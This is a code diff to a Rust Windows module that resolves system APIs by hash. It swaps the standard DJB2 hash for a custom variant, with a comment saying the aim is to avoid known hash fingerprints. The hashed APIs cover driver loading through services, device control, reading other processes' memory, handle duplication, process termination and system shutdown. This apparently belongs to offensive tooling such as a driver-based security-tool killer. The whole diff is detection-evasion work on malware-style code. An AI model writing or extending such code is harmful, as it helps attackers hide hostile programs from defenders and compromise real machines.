@@ -5,61 +5,69 @@
 
 use std::ffi::c_void;
 
-/// DJB2 hash function for ASCII strings (case-insensitive)
-pub fn djb2_hash(s: &[u8]) -> u32 {
-    let mut hash: u32 = 5381;
+/// Custom hash function for ASCII strings (case-insensitive)
+/// Non-standard seed/multiplier to avoid known hash fingerprints
+pub fn api_hash(s: &[u8]) -> u32 {
+    let mut hash: u32 = 0xA7B3_C1D5;
     for &c in s {
         let c = if c >= b'A' && c <= b'Z' { c + 32 } else { c };
-        hash = hash.wrapping_mul(33).wrapping_add(c as u32);
+        hash = hash.wrapping_mul(131).wrapping_add((c ^ 0x5E) as u32);
     }
     hash
 }
 
-/// DJB2 hash function for wide (UTF-16) strings (case-insensitive)
-pub fn djb2_hash_wide(s: &[u16]) -> u32 {
-    let mut hash: u32 = 5381;
+/// Custom hash function for wide (UTF-16) strings (case-insensitive)
+pub fn api_hash_wide(s: &[u16]) -> u32 {
+    let mut hash: u32 = 0xA7B3_C1D5;
     for &c in s {
         let c = if c >= b'A' as u16 && c <= b'Z' as u16 {
             c + 32
         } else {
             c
         };
-        hash = hash.wrapping_mul(33).wrapping_add(c as u32);
+        hash = hash.wrapping_mul(131).wrapping_add((c ^ 0x5E) as u32);
     }
     hash
 }
 
-// Pre-computed DJB2 hashes for module names (lowercase)
-pub const HASH_KERNEL32: u32 = djb2_hash_const(b"kernel32.dll");
-pub const HASH_NTDLL: u32 = djb2_hash_const(b"ntdll.dll");
-pub const HASH_ADVAPI32: u32 = djb2_hash_const(b"advapi32.dll");
+// Pre-computed hashes for module names (lowercase)
+pub const HASH_KERNEL32: u32 = api_hash_const(b"kernel32.dll");
+pub const HASH_NTDLL: u32 = api_hash_const(b"ntdll.dll");
+pub const HASH_ADVAPI32: u32 = api_hash_const(b"advapi32.dll");
 
-// Pre-computed DJB2 hashes for function names
-pub const HASH_OPEN_SC_MANAGER_W: u32 = djb2_hash_const(b"OpenSCManagerW");
-pub const HASH_CREATE_SERVICE_W: u32 = djb2_hash_const(b"CreateServiceW");
-pub const HASH_START_SERVICE_W: u32 = djb2_hash_const(b"StartServiceW");
-pub const HASH_OPEN_SERVICE_W: u32 = djb2_hash_const(b"OpenServiceW");
-pub const HASH_CONTROL_SERVICE: u32 = djb2_hash_const(b"ControlService");
-pub const HASH_DELETE_SERVICE: u32 = djb2_hash_const(b"DeleteService");
-pub const HASH_CLOSE_SERVICE_HANDLE: u32 = djb2_hash_const(b"CloseServiceHandle");
-pub const HASH_CREATE_FILE_W: u32 = djb2_hash_const(b"CreateFileW");
-pub const HASH_DEVICE_IO_CONTROL: u32 = djb2_hash_const(b"DeviceIoControl");
-pub const HASH_CLOSE_HANDLE: u32 = djb2_hash_const(b"CloseHandle");
-pub const HASH_GET_FILE_SIZE: u32 = djb2_hash_const(b"GetFileSize");
-pub const HASH_WRITE_FILE: u32 = djb2_hash_const(b"WriteFile");
-pub const HASH_VIRTUAL_PROTECT: u32 = djb2_hash_const(b"VirtualProtect");
-pub const HASH_CREATE_PROCESS_WITH_LOGON_W: u32 = djb2_hash_const(b"CreateProcessWithLogonW");
-pub const HASH_GET_PROCESS_ID: u32 = djb2_hash_const(b"GetProcessId");
-pub const HASH_DUPLICATE_HANDLE: u32 = djb2_hash_const(b"DuplicateHandle");
-pub const HASH_TERMINATE_PROCESS: u32 = djb2_hash_const(b"TerminateProcess");
-pub const HASH_NT_READ_VIRTUAL_MEMORY: u32 = djb2_hash_const(b"NtReadVirtualMemory");
-pub const HASH_NT_QUERY_VIRTUAL_MEMORY: u32 = djb2_hash_const(b"NtQueryVirtualMemory");
-pub const HASH_NT_DEVICE_IO_CONTROL_FILE: u32 = djb2_hash_const(b"NtDeviceIoControlFile");
-pub const HASH_NT_SHUTDOWN_SYSTEM: u32 = djb2_hash_const(b"NtShutdownSystem");
+// Pre-computed hashes for function names
+#[cfg(feature = "driver-loader")]
+pub const HASH_OPEN_SC_MANAGER_W: u32 = api_hash_const(b"OpenSCManagerW");
+#[cfg(feature = "driver-loader")]
+pub const HASH_CREATE_SERVICE_W: u32 = api_hash_const(b"CreateServiceW");
+#[cfg(feature = "driver-loader")]
+pub const HASH_START_SERVICE_W: u32 = api_hash_const(b"StartServiceW");
+#[cfg(feature = "driver-loader")]
+pub const HASH_OPEN_SERVICE_W: u32 = api_hash_const(b"OpenServiceW");
+#[cfg(feature = "driver-loader")]
+pub const HASH_CONTROL_SERVICE: u32 = api_hash_const(b"ControlService");
+#[cfg(feature = "driver-loader")]
+pub const HASH_DELETE_SERVICE: u32 = api_hash_const(b"DeleteService");
+#[cfg(feature = "driver-loader")]
+pub const HASH_CLOSE_SERVICE_HANDLE: u32 = api_hash_const(b"CloseServiceHandle");
+pub const HASH_CREATE_FILE_W: u32 = api_hash_const(b"CreateFileW");
+pub const HASH_DEVICE_IO_CONTROL: u32 = api_hash_const(b"DeviceIoControl");
+pub const HASH_CLOSE_HANDLE: u32 = api_hash_const(b"CloseHandle");
+pub const HASH_GET_FILE_SIZE: u32 = api_hash_const(b"GetFileSize");
+pub const HASH_WRITE_FILE: u32 = api_hash_const(b"WriteFile");
+pub const HASH_VIRTUAL_PROTECT: u32 = api_hash_const(b"VirtualProtect");
+pub const HASH_CREATE_PROCESS_WITH_LOGON_W: u32 = api_hash_const(b"CreateProcessWithLogonW");
+pub const HASH_GET_PROCESS_ID: u32 = api_hash_const(b"GetProcessId");
+pub const HASH_DUPLICATE_HANDLE: u32 = api_hash_const(b"DuplicateHandle");
+pub const HASH_TERMINATE_PROCESS: u32 = api_hash_const(b"TerminateProcess");
+pub const HASH_NT_READ_VIRTUAL_MEMORY: u32 = api_hash_const(b"NtReadVirtualMemory");
+pub const HASH_NT_QUERY_VIRTUAL_MEMORY: u32 = api_hash_const(b"NtQueryVirtualMemory");
+pub const HASH_NT_DEVICE_IO_CONTROL_FILE: u32 = api_hash_const(b"NtDeviceIoControlFile");
+pub const HASH_NT_SHUTDOWN_SYSTEM: u32 = api_hash_const(b"NtShutdownSystem");
 
-/// Compile-time DJB2 hash computation
-pub const fn djb2_hash_const(s: &[u8]) -> u32 {
-    let mut hash: u32 = 5381;
+/// Compile-time hash computation (custom algorithm)
+pub const fn api_hash_const(s: &[u8]) -> u32 {
+    let mut hash: u32 = 0xA7B3_C1D5;
     let mut i = 0;
     while i < s.len() {
         let c = if s[i] >= b'A' && s[i] <= b'Z' {
@@ -67,7 +75,7 @@ pub const fn djb2_hash_const(s: &[u8]) -> u32 {
         } else {
             s[i]
         };
-        hash = hash.wrapping_mul(33).wrapping_add(c as u32);
+        hash = hash.wrapping_mul(131).wrapping_add((c ^ 0x5E) as u32);
         i += 1;
     }
     hash
@@ -109,7 +117,7 @@ impl ApiResolver {
                 if name.length > 0 && !name.buffer.is_null() {
                     let name_slice =
                         std::slice::from_raw_parts(name.buffer, (name.length / 2) as usize);
-                    let hash = djb2_hash_wide(name_slice);
+                    let hash = api_hash_wide(name_slice);
 
                     if hash == HASH_KERNEL32 {
                         kernel32_base = (*entry).dll_base;
@@ -309,7 +317,7 @@ unsafe fn get_export_by_hash(module_base: *mut u8, func_hash: u32) -> Option<*mu
             }
         }
         let name_bytes = std::slice::from_raw_parts(name_ptr, len);
-        let hash = djb2_hash(name_bytes);
+        let hash = api_hash(name_bytes);
 
         if hash == func_hash {
             let ordinal = *ordinals.add(i as usize) as usize;
